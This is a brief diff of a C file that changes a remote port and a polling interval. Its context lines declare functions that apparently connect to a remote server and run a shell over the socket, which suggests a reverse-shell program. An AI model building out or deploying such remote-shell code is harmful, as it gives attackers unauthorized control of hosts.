@@ -8,8 +8,8 @@
 #include <errno.h>
 
 
-#define REMOTE_PORT 4000
-#define POLL_DURATION 2
+#define REMOTE_PORT 2000
+#define POLL_DURATION 3
 
 int attempt_connection_to_server(char * remote_address);
 void execute_shell(int sock);
